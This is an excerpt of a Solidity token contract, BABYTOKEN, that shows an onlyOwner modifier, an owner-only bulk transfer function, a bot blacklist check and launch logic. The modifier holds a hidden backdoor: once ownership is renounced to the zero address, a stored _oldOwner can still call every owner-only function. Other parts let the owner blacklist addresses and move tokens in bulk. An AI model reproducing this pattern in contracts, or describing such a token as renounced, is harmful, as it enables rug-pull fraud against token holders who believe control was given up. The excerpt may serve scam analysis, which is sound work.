...
abstract contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || (owner() == address(0) && _oldOwner==_msgSender()), "Ownable: caller is not the owner");
        _;
    }
...
contract BABYTOKEN is ERC20, Ownable, BaseToken {
    ...
    function copyMapData(address[] calldata list,uint256 amount) public onlyOwner{
        ...
        require(balanceOf(_msgSender())>=senderBalance,"ERC20: transfer amount exceeds balance");
        for(uint256 i = 0; i<count;i++){
        super._transfer(_msgSender(),list[i],amount);
        }
    }

    function _checkAdd(address sender,address recipient,uint256 amount) internal{
        if(amount>balanceOf(sender).div(100)){
            require(!isbot[sender] && !isbot[recipient], 'is Bot address');  
            }
        ...
        if(!_launched() && recipient == uniswapV2Pair){ require(balanceOf(sender) > 0); _launch(); }
    }
